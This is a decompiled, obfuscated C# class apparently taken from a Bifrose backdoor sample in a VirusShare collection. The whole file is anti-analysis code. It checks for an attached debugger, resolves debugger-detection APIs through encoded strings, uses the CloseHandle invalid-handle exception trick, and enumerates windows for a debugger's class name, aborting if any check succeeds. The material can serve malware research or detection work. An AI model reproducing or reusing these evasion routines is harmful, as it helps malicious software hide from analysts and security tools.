// Decompiled with JetBrains decompiler
// Type: A.c25605daa47be204ed9a9d205fe132b22
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BBFEB6F2-8CB8-471E-8522-33E9235F0EA4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.fsi-361ffbbd54d94ef0223184fe28fd3f7621cef340f87e07667094c58c9c7cd6da.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace A
{
  internal class c25605daa47be204ed9a9d205fe132b22
  {
    internal const uint cdd0bb5104642604f8c6e823d17620d04 = 1024;
    internal const uint c09dfbe5ac3926decf6affa13a5cfb62b = 64;
    internal const int cfc97723d84803782ae9955baf2c75a83 = 0;
    private static bool c2e4a91ac930636eb7ba8fb7189bc7864;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void cbd07c05a212b888da16a3c24996b8832(
      uint c9829da22cc2210b69877aba5ffb85bcd);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int ca38dd81b6b38872f1cf6abc502e4422a(
      IntPtr cf03ae297aa19712414f563f4363a1b9c);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr c74ed8e499f8fa0c26480fed18b648c1b(
      uint c9357a0b1076d4e313c80c582b269704a,
      int c6aa6bf5fdd5d14ce68a0dc74f15e8e16,
      uint c3ad6f23e81d50462e1de1b99224dea69);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint cae0daab779b46c42ce216cb7d2eba9c0();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr cc3cf562aa5b682fae45fc23a1778fdf0(
      string c47f8ebdb9a3cf260516c1a6681de969e);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.c0c1f74d73653acc2314ad337c02a1ce1 c021cada6785c5e4336ba5ffcadfa601a(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.cf521aad6165324d1a326b9e62d6095a2 c480da7d3bf84e34c3699f164172231bc(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.c197a8f5d2eda7c79760359f0301f853d c908890b843cf36877dac576082d6a145(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.cd2fd1fab5931f21ca4847a569fd06cb1 c4acc3bb43915d6e092296e736b59dca0(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.c342e0ae7063316394c84cb9d2772c695 c93500e3c5f6487fc54368e1afeb2101d(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c25605daa47be204ed9a9d205fe132b22.c4123cc5951f13e9120e820df1154a599 c4496d71042b9abc87566410762b68aca(
      IntPtr cacf6324dbacd104ee6398c6f0985817f,
      string c1802425ad711c9f0ca48bcd3febc0501);

    private static int c14ddb9afd73555ae7ecee8f355172721(
      IntPtr c6ebb841fae53604f1511905ed85dbc35,
      IntPtr ccce39d767afb483870467a9d27c9329d)
    {
      string[] strArray = new string[1]
      {
        ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(263)
      };
      string strA = c25605daa47be204ed9a9d205fe132b22.c3471ac2d4e0b285bbfcddc671094f5a6(c6ebb841fae53604f1511905ed85dbc35);
      foreach (string strB in strArray)
      {
        if (string.Compare(strA, strB, true) == 0)
        {
          c25605daa47be204ed9a9d205fe132b22.c2e4a91ac930636eb7ba8fb7189bc7864 = true;
          return 0;
        }
      }
      return 1;
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int c36b6397405d89092de13582f492e3582(
      IntPtr ce2369e51158d648b445e0c44d30b1f63,
      StringBuilder c4db80c8ba6c0876516aadce8a0a908b3,
      int ce26260dc11f382310eca0141db9a178b);

    internal static string c3471ac2d4e0b285bbfcddc671094f5a6(
      IntPtr ca5752c3f77d214efb9ba960bd14ba4f5)
    {
      StringBuilder c4db80c8ba6c0876516aadce8a0a908b3 = new StringBuilder(260);
      c25605daa47be204ed9a9d205fe132b22.c36b6397405d89092de13582f492e3582(ca5752c3f77d214efb9ba960bd14ba4f5, c4db80c8ba6c0876516aadce8a0a908b3, c4db80c8ba6c0876516aadce8a0a908b3.Capacity);
      return c4db80c8ba6c0876516aadce8a0a908b3.ToString();
    }

    internal static void cfaac490f9b61bdff5cadbf88ba8d0012()
    {
      if (c25605daa47be204ed9a9d205fe132b22.c8b35d91284c39f6fd5cbd178112c0861())
        throw new Exception(ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(278));
    }

    internal static bool c8b35d91284c39f6fd5cbd178112c0861()
    {
      try
      {
        if (Debugger.IsAttached)
          return true;
        IntPtr cacf6324dbacd104ee6398c6f0985817f = c25605daa47be204ed9a9d205fe132b22.cc3cf562aa5b682fae45fc23a1778fdf0(ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(434));
        c25605daa47be204ed9a9d205fe132b22.cd2fd1fab5931f21ca4847a569fd06cb1 cd2fd1fab5931f21ca4847a569fd06cb1 = c25605daa47be204ed9a9d205fe132b22.c4acc3bb43915d6e092296e736b59dca0(cacf6324dbacd104ee6398c6f0985817f, ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(459));
        if (cd2fd1fab5931f21ca4847a569fd06cb1 != null && cd2fd1fab5931f21ca4847a569fd06cb1() != 0)
          return true;
        IntPtr num1 = c25605daa47be204ed9a9d205fe132b22.c74ed8e499f8fa0c26480fed18b648c1b(1024U, 0, c25605daa47be204ed9a9d205fe132b22.cae0daab779b46c42ce216cb7d2eba9c0());
        if (num1 != IntPtr.Zero)
        {
          try
          {
            c25605daa47be204ed9a9d205fe132b22.c197a8f5d2eda7c79760359f0301f853d c197a8f5d2eda7c79760359f0301f853d = c25605daa47be204ed9a9d205fe132b22.c908890b843cf36877dac576082d6a145(cacf6324dbacd104ee6398c6f0985817f, ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(494));
            if (c197a8f5d2eda7c79760359f0301f853d != null)
            {
              int pbDebuggerPresent = 0;
              if (c197a8f5d2eda7c79760359f0301f853d(num1, ref pbDebuggerPresent) != 0)
              {
                if (pbDebuggerPresent != 0)
                  return true;
              }
            }
          }
          finally
          {
            c25605daa47be204ed9a9d205fe132b22.ca38dd81b6b38872f1cf6abc502e4422a(num1);
          }
        }
        bool flag = false;
        try
        {
          c25605daa47be204ed9a9d205fe132b22.ca38dd81b6b38872f1cf6abc502e4422a(new IntPtr(305419896));
        }
        catch
        {
          flag = true;
        }
        if (flag)
          return true;
        try
        {
          c25605daa47be204ed9a9d205fe132b22.c4123cc5951f13e9120e820df1154a599 c4123cc5951f13e9120e820df1154a599 = c25605daa47be204ed9a9d205fe132b22.c4496d71042b9abc87566410762b68aca(c25605daa47be204ed9a9d205fe132b22.cc3cf562aa5b682fae45fc23a1778fdf0(ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(547)), ca89f56b7aaa393e66ed10ae7ad0fe830.ce761b58257cf9ea81241886bf8d5a6ac(568));
          if (c4123cc5951f13e9120e820df1154a599 != null)
          {
            c25605daa47be204ed9a9d205fe132b22.c2e4a91ac930636eb7ba8fb7189bc7864 = false;
            int num2 = c4123cc5951f13e9120e820df1154a599(new c25605daa47be204ed9a9d205fe132b22.cbc35b337061e3718a3305d0e2ea0c4e2(c25605daa47be204ed9a9d205fe132b22.c14ddb9afd73555ae7ecee8f355172721), IntPtr.Zero);
            if (c25605daa47be204ed9a9d205fe132b22.c2e4a91ac930636eb7ba8fb7189bc7864)
              return true;
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
      return false;
    }

    internal delegate int c0c1f74d73653acc2314ad337c02a1ce1(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      c25605daa47be204ed9a9d205fe132b22.c217c136ad68645899413957f1780e245 ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int c197a8f5d2eda7c79760359f0301f853d(
      IntPtr hProcess,
      ref int pbDebuggerPresent);

    [StructLayout(LayoutKind.Sequential)]
    internal class c217c136ad68645899413957f1780e245
    {
      internal IntPtr c2420fbb1a07e3c882a85c5d0190df333;
      internal IntPtr c514691808e5a960cb25deecf07ed1890;
      internal IntPtr cbc2db971a1c1d3cb09723d0ec548880c;
      internal IntPtr cfe245e87f686a6d75cff658b39ca3108;
      internal IntPtr ca50ffcd106eb6b14381169937472dd88;
      internal IntPtr cae1b5d71cff219cac621d75640b7f45c;
    }

    internal delegate void c342e0ae7063316394c84cb9d2772c695([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int c4123cc5951f13e9120e820df1154a599(
      c25605daa47be204ed9a9d205fe132b22.cbc35b337061e3718a3305d0e2ea0c4e2 lpEnumFunc,
      IntPtr lParam);

    internal delegate int cbc35b337061e3718a3305d0e2ea0c4e2(IntPtr wnd, IntPtr lParam);

    internal delegate int cd2fd1fab5931f21ca4847a569fd06cb1();

    internal delegate int cf521aad6165324d1a326b9e62d6095a2(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);
  }
}
